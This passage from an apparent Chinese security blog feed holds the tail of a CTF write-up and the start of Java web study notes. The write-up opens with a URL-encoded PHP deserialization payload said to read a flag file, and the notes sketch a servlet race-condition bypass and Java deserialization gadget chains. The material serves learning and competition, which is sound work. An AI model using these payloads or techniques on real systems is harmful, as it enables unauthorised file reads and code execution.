class="code"><pre><span class="line">O%<span class="number">3</span>A20%<span class="number">3</span>A%<span class="number">22</span>christmasTree%<span class="number">5</span>Camg2Vw%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>PCR49GlRM%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A24%<span class="number">3</span>A%<span class="number">22</span>christmasTree%<span class="number">5</span>CvS1qenzGWr%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>yrVWMn9%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A22%<span class="number">3</span>A%<span class="number">22</span>christmasTree%<span class="number">5</span>CGGcIkQ6E%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>CK5OgoyC%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A24%<span class="number">3</span>A%<span class="number">22</span>christmasTree%<span class="number">5</span>CuGnuU5pGgQ%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>XbW5o6yiGv%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A24%<span class="number">3</span>A%<span class="number">22</span>christmasTree%<span class="number">5</span>CezlgUUHCdQ%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>fDViVU%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A21%<span class="number">3</span>A%<span class="number">22</span>christmasTree%<span class="number">5</span>Cp6NArTi%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>VbpsE7wqUH%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A20%<span class="number">3</span>A%<span class="number">22</span>christmasTree%<span class="number">5</span>CxT506K%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>Dblxvn%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A24%<span class="number">3</span>A%<span class="number">22</span>christmasTree%<span class="number">5</span>Cu1q3m04qZb%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>NGIlAGGLv%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A22%<span class="number">3</span>A%<span class="number">22</span>christmasTree%<span class="number">5</span>Cc76So3oF%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>cwQWOIEL%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A24%<span class="number">3</span>A%<span class="number">22</span>christmasTree%<span class="number">5</span>CeHSt3I5L30%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>exoEH1%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A24%<span class="number">3</span>A%<span class="number">22</span>christmasTree%<span class="number">5</span>CFK0LfIlrxm%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>gZ9IzdbF6T%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A22%<span class="number">3</span>A%<span class="number">22</span>christmasTree%<span class="number">5</span>Co5d0ioNZ%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>exGoDOPm%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A24%<span class="number">3</span>A%<span class="number">22</span>christmasTree%<span class="number">5</span>CSKVnfvfbas%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>UOvWbl%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A21%<span class="number">3</span>A%<span class="number">22</span>christmasTree%<span class="number">5</span>CT6Y5QYS%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>p9mwE7l%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A21%<span class="number">3</span>A%<span class="number">22</span>christmasTree%<span class="number">5</span>CRonyv7u%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>uDQ0ehd4p%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A23%<span class="number">3</span>A%<span class="number">22</span>christmasTree%<span class="number">5</span>Cd9vgRnlEA%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>T4rUU9R%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A24%<span class="number">3</span>A%<span class="number">22</span>christmasTree%<span class="number">5</span>CXl5V1fEbzD%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>fgVgm4TV97%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A23%<span class="number">3</span>A%<span class="number">22</span>christmasTree%<span class="number">5</span>CxEFW8yw08%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>nYuAuh2%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A24%<span class="number">3</span>A%<span class="number">22</span>christmasTree%<span class="number">5</span>CUgh4SYk00D%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>tQF7ER%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A23%<span class="number">3</span>A%<span class="number">22</span>christmasTree%<span class="number">5</span>CAN9pNsmlT%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>Ipz7D3%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span><span class="built_in">stdClass</span>%<span class="number">22</span>%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>Ds%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>uqkULP0XD%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span><span class="built_in">stdClass</span>%<span class="number">22</span>%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>D%<span class="number">7</span>Ds%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>aysl2yR5g%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span><span class="built_in">stdClass</span>%<span class="number">22</span>%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>D%<span class="number">7</span>Ds%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>m4pnFndZoX%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span><span class="built_in">stdClass</span>%<span class="number">22</span>%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>D%<span class="number">7</span>Ds%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>TEODq2c3Uo%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span><span class="built_in">stdClass</span>%<span class="number">22</span>%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>D%<span class="number">7</span>Ds%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>Q7mg44bg%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span><span class="built_in">stdClass</span>%<span class="number">22</span>%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>D%<span class="number">7</span>Ds%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>UO4yLd%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span><span class="built_in">stdClass</span>%<span class="number">22</span>%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>D%<span class="number">7</span>Ds%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>rHYG3Wr%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span><span class="built_in">stdClass</span>%<span class="number">22</span>%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>Ds%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>sPEbogX4%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span><span class="built_in">stdClass</span>%<span class="number">22</span>%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>D%<span class="number">7</span>Ds%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>yKwNrpRAQ%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span><span class="built_in">stdClass</span>%<span class="number">22</span>%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>Ds%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>XEH9BQ%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span><span class="built_in">stdClass</span>%<span class="number">22</span>%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>D%<span class="number">7</span>Ds%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>Vkyud3%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span><span class="built_in">stdClass</span>%<span class="number">22</span>%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>D%<span class="number">7</span>Ds%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>S839pvNRU%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span><span class="built_in">stdClass</span>%<span class="number">22</span>%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><br>然后调用的参数：9ADRPhlSX1UYKREV<br>即可读到/fumo</p>
<h3 id="fumo-xor-cli"><a href="#fumo-xor-cli" class="headerlink" title="fumo xor cli"></a>fumo xor cli</h3><p>nc 远程发现是通过五颜六色的字符打印出一个 gif，肉眼发现有两帧不一样，把 nc 到的字节流重定向到本地文件，然后手动把这两帧提取出来，都是 <code>50*133</code> 个字符的，结合题意是xor，尝试rgb异或，本以为是个东西，结果啥也不是，完全不会了，这题放弃了。</p>
<p><img src="/2022/01/09/L3HCTF-SCTF2021/assets/image-20220110171014850.png" alt="image-20220110171014850"></p>
<p>大半夜的，pill0w无意间发现链接的公众号推送的最后一张图有异样，下载原图，仔细观察发现：</p>
<p><img src="/2022/01/09/L3HCTF-SCTF2021/assets/image-20220110170958808.png" alt="image-20220110170958808"></p>
<p>有规律的藏有五颜六色的像素，提取出来，发现是 <code>133*100</code> 的，把这个拆成两个 <code>50*133</code> ，然后都旋转为正的，将 4 张 <code>50*133</code> 的图异或，发现大部分都是 (0,0,0)，部分是三个一样的，再经过一些简单的图片处理，得到flag。</p>
<p><img src="/2022/01/09/L3HCTF-SCTF2021/assets/image-20220110170944308.png" alt="image-20220110170944308"></p>
<p>全程处理数据的脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rerange</span>(<span class="params">s</span>):</span></span><br><span class="line">    t = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s[<span class="number">0</span>])):</span><br><span class="line">        t.append([s[_][i] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s))])</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line"></span><br><span class="line">f = Image.<span class="built_in">open</span>(<span class="string">&#x27;640.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line">a = np.array(f)</span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line">wx_list_1 = []</span><br><span class="line">wx_list_2 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">9</span> == <span class="number">1</span> <span class="keyword">and</span> i &lt; <span class="number">1190</span>:</span><br><span class="line">        b = a[i]</span><br><span class="line">        now_list_1 = []</span><br><span class="line">        now_list_2 = []</span><br><span class="line">        cnt_j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b)):</span><br><span class="line">            <span class="keyword">if</span> j % <span class="number">9</span> == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span> cnt_j &lt; <span class="number">50</span>:</span><br><span class="line">                    now_list_1.append(b[j])</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    now_list_2.append(b[j])</span><br><span class="line">                cnt_j += <span class="number">1</span></span><br><span class="line">        wx_list_1.append(now_list_1)</span><br><span class="line">        wx_list_2.append(now_list_2)</span><br><span class="line">        cnt += <span class="number">1</span></span><br><span class="line">wx_list_1 = rerange(wx_list_1)</span><br><span class="line">wx_list_2 = rerange(wx_list_2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">fp = <span class="built_in">open</span>(<span class="string">&#x27;pic1.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">list_1 = []</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> fp.readlines():</span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;\[\d+;\d+;(\d+);(\d+);(\d+)ma&#x27;</span>)</span><br><span class="line">    a = pattern.findall(line.decode())</span><br><span class="line">    a = [(<span class="built_in">int</span>(_[<span class="number">0</span>]), <span class="built_in">int</span>(_[<span class="number">1</span>]), <span class="built_in">int</span>(_[<span class="number">2</span>])) <span class="keyword">for</span> _ <span class="keyword">in</span> a]</span><br><span class="line">    list_1.append(a)</span><br><span class="line">fp.close()</span><br><span class="line"></span><br><span class="line">fp = <span class="built_in">open</span>(<span class="string">&#x27;pic2.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">list_2 = []</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> fp.readlines():</span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;\[\d+;\d+;(\d+);(\d+);(\d+)m[a-zA-Z0-9\:\/\.\_]&#x27;</span>)</span><br><span class="line">    a = pattern.findall(line.decode())</span><br><span class="line">    a = [(<span class="built_in">int</span>(_[<span class="number">0</span>]), <span class="built_in">int</span>(_[<span class="number">1</span>]), <span class="built_in">int</span>(_[<span class="number">2</span>])) <span class="keyword">for</span> _ <span class="keyword">in</span> a]</span><br><span class="line">    list_2.append(a)</span><br><span class="line">fp.close()</span><br><span class="line"></span><br><span class="line">fp = <span class="built_in">open</span>(<span class="string">&#x27;pic3&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(list_1)):</span><br><span class="line">    a, b = wx_list_1[i], list_1[i]</span><br><span class="line">    c, d = wx_list_2[i], list_2[i]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">        r1, g1, b1 = a[j]</span><br><span class="line">        r2, g2, b2 = b[j]</span><br><span class="line">        r3, g3, b3 = c[j]</span><br><span class="line">        r4, g4, b4 = d[j]</span><br><span class="line">        </span><br><span class="line">        r0 = r2 ^ r1 ^ r3 ^ r4</span><br><span class="line">        g0 = g2 ^ g1 ^ g3 ^ g4</span><br><span class="line">        b0 = b2 ^ b1 ^ b3 ^ b4</span><br><span class="line">        <span class="keyword">if</span> r0 != <span class="number">0</span>:</span><br><span class="line">            r0, b0, g0 = <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span></span><br><span class="line">        <span class="comment">#     # c0 = chr(ord(c1) ^ ord(c2))</span></span><br><span class="line">        payload = <span class="string">&#x27;[38;2;%d;%d;%dm▇&#x27;</span> % (r0, g0, b0)</span><br><span class="line">        fp.write(<span class="string">b&#x27;\x1b&#x27;</span> + payload.encode())</span><br><span class="line">    fp.write(<span class="string">&#x27;\n&#x27;</span>.encode())</span><br></pre></td></tr></table></figure>
<p>当时看到公众号就直接无视了，真没想到这最后一张图居然有问题。。。。</p>
<h3 id="cubic"><a href="#cubic" class="headerlink" title="cubic(*)"></a>cubic(*)</h3><p>大半夜看的这题，san值基本掉光了，当时已经把这题做法口糊出来了，但是因为各种脑残问题没搞出来。</p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaWeb学习笔记</title>
    <url>/2022/01/17/JavaWeb%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>有关java的web知识所知甚少，趁着这个假期赶紧补补。</p>
<span id="more"></span>
<h1 id="《Java代码审计》学习笔记"><a href="#《Java代码审计》学习笔记" class="headerlink" title="《Java代码审计》学习笔记"></a>《Java代码审计》学习笔记</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>靠慢慢做题补充的。</p>
<h3 id="jdk-amp-jre"><a href="#jdk-amp-jre" class="headerlink" title="jdk&amp;jre"></a>jdk&amp;jre</h3><p>玩mc的时候我记得只用装jre就好了。</p>
<p>JDK：Java Development Kit（JAVA开发工具包）</p>
<p>JRE：Java Runtime Environment（JAVA运行时类库）</p>
<p>包含关系：JDK包含JRE包含JVM</p>
<h3 id="servlet"><a href="#servlet" class="headerlink" title="servlet"></a>servlet</h3><p>全称为Server Applet。</p>
<p>Servlet3.0之前的版本用<code>web.xml</code>配置，而后采用注解配置。</p>
<p>servlet生命周期：用户发起请求-&gt;请求解析-&gt;servlet实体创建，调用init方法，调用service方法-&gt;servlet将结果返回服务器-&gt;响应请求-&gt;destroy</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.tomcatdemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name = &quot;helloServlet&quot;, value = &quot;/hello-servlet&quot;)</span> #这里就是servlet3+自带的标注。</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        message = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        System.out.println(message);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Hello</span></span><br><span class="line">        PrintWriter out = response.getWriter();</span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;h1&gt;&quot;</span> + message + <span class="string">&quot;&lt;/h1&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;baibai&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Tomcat实例类只实例化一次，init和destroy只在整个服务器运行的全过程中调用一次。</p>
<p><img src="https://www.runoob.com/wp-content/uploads/2014/07/Servlet-LifeCycle.jpg" alt="Servlet 生命周期"></p>
<h4 id="servlet的线程安全"><a href="#servlet的线程安全" class="headerlink" title="servlet的线程安全"></a>servlet的线程安全</h4><blockquote>
<p><a href="https://www.cnblogs.com/binyue/p/4513577.html">https://www.cnblogs.com/binyue/p/4513577.html</a></p>
<p>JSP/Servlet容器默认是采用<strong>单实例多线程(这是造成线程安全的主因)方式处理多个请求</strong>的，这种默认以多线程方式执行的设计可大大降低对系统的资源需求，提高系统的并发量及响应时间。</p>
<h3 id="如何控制Servlet的线程安全性？"><a href="#如何控制Servlet的线程安全性？" class="headerlink" title="如何控制Servlet的线程安全性？"></a>如何控制Servlet的线程安全性？</h3><p>避免使用实例变量<br>避免使用非线程安全的集合</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*    */</span>   <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line"><span class="comment">/* 34 */</span>     String reqName = req.getParameter(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"><span class="comment">/* 35 */</span>     <span class="keyword">if</span> (reqName != <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="comment">/* 36 */</span>       <span class="keyword">this</span>.name = reqName;</span><br><span class="line"><span class="comment">/*    */</span>     &#125;</span><br><span class="line"><span class="comment">/*    */</span>     </span><br><span class="line"><span class="comment">/* 39 */</span>     <span class="keyword">if</span> (Secr3t.check(<span class="keyword">this</span>.name)) &#123;</span><br><span class="line"><span class="comment">/* 40 */</span>       Response(resp, <span class="string">&quot;no vnctf2022!&quot;</span>);</span><br><span class="line"><span class="comment">/*    */</span>       </span><br><span class="line"><span class="comment">/*    */</span>       <span class="keyword">return</span>;</span><br><span class="line"><span class="comment">/*    */</span>     &#125; </span><br><span class="line"><span class="comment">/* 44 */</span>     <span class="keyword">if</span> (Secr3t.check(<span class="keyword">this</span>.name)) &#123;</span><br><span class="line"><span class="comment">/* 45 */</span>       Response(resp, <span class="string">&quot;The Key is &quot;</span> + Secr3t.getKey());</span><br><span class="line"><span class="comment">/*    */</span>     &#125;</span><br><span class="line"><span class="comment">/*    */</span>   &#125;</span><br></pre></td></tr></table></figure>
<p>在上述代码中，this.name由于是实例变量，故线程不安全，可以通过条件竞争绕过。</p>
<h3 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h3><p>过滤器，实现对web资源的管理，貌似和servlet原理差不多。</p>
<h3 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h3><p>这个超级重要</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException </span>&#123;</span><br><span class="line">    Class name = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">    System.out.println(name);</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; name2 = Runtime.class;</span><br><span class="line">    System.out.println(name2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*返回此Object的运行时类。</span></span><br><span class="line"><span class="comment">    返回的类对象是由所表示的类的static synchronized方法锁定的对象。*/</span></span><br><span class="line"></span><br><span class="line">    Runtime rt = Runtime.getRuntime();</span><br><span class="line">    Class&lt;?&gt; name3 = rt.getClass();</span><br><span class="line">    System.out.println(name3);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h3><p>和php差不多，只要一个类后面<code>implements Serializable</code>，就可以被序列化。</p>
<p>序列化要求比较苛刻，要求package也要一样。</p>
<h4 id="transient关键字"><a href="#transient关键字" class="headerlink" title="transient关键字"></a>transient关键字</h4><p>一旦变量被transient修饰，变量将不再是对象持久化的一部分，该变量内容在序列化后无法获得访问。</p>
<p>一个静态变量不管是否被transient修饰，均不能被序列化。</p>
<p>绕过transient：在类中添加</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream oos)</span></span>;</span><br></pre></td></tr></table></figure>
<p>具体例子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException 	</span>&#123;</span><br><span class="line">     s.defaultReadObject();</span><br><span class="line">     <span class="keyword">this</span>.height = (String)s.readObject();</span><br><span class="line">&#125;</span><br><span class="line">   <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream oos)</span></span>&#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           oos.defaultWriteObject();</span><br><span class="line">           oos.writeObject(<span class="keyword">this</span>.height);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">           <span class="keyword">return</span>;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
<p>往里硬写。</p>
<h3 id="CC链学习"><a href="#CC链学习" class="headerlink" title="CC链学习"></a>CC链学习</h3><h4 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h4><p><a href="https://www.anquanke.com/post/id/229108#h2-0">https://www.anquanke.com/post/id/229108#h2-0</a></p>
<p>注意的一点是，如果报了什么cannot access什么的，很有可能是你的杀毒软件把一些恶意class删掉了。。赶紧恢复就好。</p>
<p>不过我在IDEA里搭建了这个环境，方便动调。</p>
<h2 id="Idea-WSL2-Docker环境搭建"><a href="#Idea-WSL2-Docker环境搭建" class="headerlink" title="Idea+WSL2+Docker环境搭建"></a>Idea+WSL2+Docker环境搭建</h2><h3 id="WSL2"><a href="#WSL2" class="headerlink" title="WSL2"></a>WSL2</h3><p>自带的jdk11，位置在<code>/usr/lib/jvm</code>,在<code>~/.bashrc</code>下编辑这个：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64</span><br><span class="line"><span class="built_in">export</span> CLASSPATH=<span class="variable">$&#123;JAVA_HOME&#125;</span>/lib</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$&#123;JAVA_HOME&#125;</span>/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>
<blockquote>
